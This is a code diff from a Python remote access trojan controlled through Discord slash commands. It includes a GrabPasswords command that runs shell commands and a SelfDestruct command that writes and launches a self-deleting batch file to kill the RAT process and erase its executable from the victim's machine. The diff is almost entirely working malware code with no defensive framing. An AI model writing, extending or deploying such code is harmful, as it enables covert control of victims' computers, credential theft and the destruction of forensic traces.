@@ -944,7 +944,7 @@ async def GrabPasswords_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
         import subprocess
         import os
-        temp= os.getenv('temp')
+        temp = os.getenv('temp')
         def shell(command):
             output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             global status
@@ -968,8 +968,7 @@ async def StartProc_command(ctx: SlashContext, dirtofile: str):
 
 @slash.slash(name="SelfDestruct", description="Delete all traces of RAT on users PC", guild_ids=g)
 async def SelfDestruct_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name: 
-        import inspect
+    if ctx.channel.name == channel_name:
         import os
         import sys
         import inspect
@@ -980,14 +979,17 @@ async def SelfDestruct_command(ctx: SlashContext):
         cwd2 = sys.argv[0]
         rat_path = f'{cwd}\\{cwd2}.exe'
         ###### Remove temp files ######
-        bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + rat_path + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
+        data = f"Killed Rat PID: {pid}\n\nRemoved rat file!"
+        embed = discord.Embed(title="Self Destruct Complete", description=f"```{data}```")
+        await ctx.send(embed=embed)
+        await ctx.send(f"```Killed Task PID: ``{pid}\n\n")
+        bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
         temp6 = temp + r"\\kill.bat"
         if os.path.isfile(temp6):
             os.remove(temp6)
         f6 = open(temp + r"\\kill.bat", 'w')
         f6.write(bat)
         f6.close()
-        await ctx.send(f"Removed all traces of the rat!")
         os.system(r"start /min %temp%\\kill.bat")
         # try:
         #     FILE = temp + r"\\destory.py"
